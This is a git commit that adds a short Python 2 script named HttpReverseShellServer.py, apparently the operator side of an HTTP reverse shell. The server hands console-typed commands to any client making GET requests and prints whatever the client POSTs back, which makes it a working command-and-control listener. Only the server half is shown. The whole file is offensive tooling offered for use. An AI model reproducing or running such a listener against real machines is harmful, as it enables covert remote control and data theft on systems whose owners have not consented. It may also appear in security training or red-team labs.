dceb9c578e43f68aeb4e4409d0faa618772f633e
Preet Kamal <xpreetkamal007@gmail.com>
2018-09-08 01:39:57 +0530

    Add files via upload

---
+++ HttpReverseShell/HttpReverseShellServer.py
@@ -0,0 +1,30 @@
+import BaseHTTPServer
+
+Host_Name = '127.0.0.1'
+Host_Port = 80
+
+class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+
+    def do_GET(s):
+        command = raw_input("Shell>")
+        s.send_response(200)
+        s.send_header("Content-type","text/html")
+        s.end_headers()
+        s.wfile.write(command)
+
+    def do_POST(s):
+        s.send_response(200)
+        s.end_headers()
+        length=int(s.headers['Content-Length'])
+        postVar = s.rfile.read(length)
+        print (postVar)
+
+
+if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((Host_Name,Host_Port),MyHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('Server is terminated')
+        httpd.server_close()
